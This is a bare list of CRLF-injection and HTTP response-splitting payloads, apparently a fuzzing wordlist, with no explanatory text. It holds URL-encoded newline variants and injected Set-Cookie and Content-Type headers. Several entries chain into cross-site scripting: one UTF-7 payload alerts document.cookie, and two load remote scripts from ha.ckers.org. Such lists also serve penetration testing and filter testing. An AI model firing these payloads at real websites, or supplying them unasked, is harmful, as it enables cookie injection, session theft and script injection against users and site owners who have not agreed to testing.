%E5%98%8A%E5%98%8DSet-Cookie:%20test

REF: http://blog.innerht.ml/twitter-crlf-injection/

%0d%0a
%0d%0a%0d%0a
r%0d%0aContentLength:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContentType:%20text/html%0d%0aContentLength:%2019%0d%0a%0d%0a<html>Injected%02Content</html>
%0d%0d%0a%0a
0x0D0x0A
0x0D0x0D0x0A0x0A
\r\n
%5cr%5cn
%0%0d%0ad%0%0d%0aa
%0%0D%0AD%0%0D%0AA
%0d%0aContentType:%20text/html;charset=UTF-7%0d%0aContent-Length:%20129%0d%0a%0d%0a%2BADw-html%2BAD4-%2BADw-body%2BAD4-%2BADw-script%2BAD4-alert%28%27XSS,cookies:%27%2Bdocument.cookie%29%2BADw-/script%2BAD4-%2BADw-/body%2BAD4-%2BADw-/html%2BAD4
%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E
%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E
%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3Ehttp://www.test.com
%0d%0a%0d%0a%3Chtml%3E%3Cbody%3E%3C%2Fbody%3E%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fs.js%3E%3C%2Fscript%3E%3Cscript%3Ealert(%22location.host%20is:%20%22%2Blocation.host)%3C%2Fscript%3E%3C%2Fhtml%3E
%0d%0a%0d%0a%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2Fscript%3E
%22%3E%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E%3C%22
%0AContent-type:%20text/html%0A%0Ahttp://www.test.com/%3Cscript%3Ealert(%22XSS%22)%3C/script%3E
%0d%0a%0d%0a%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E
%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E


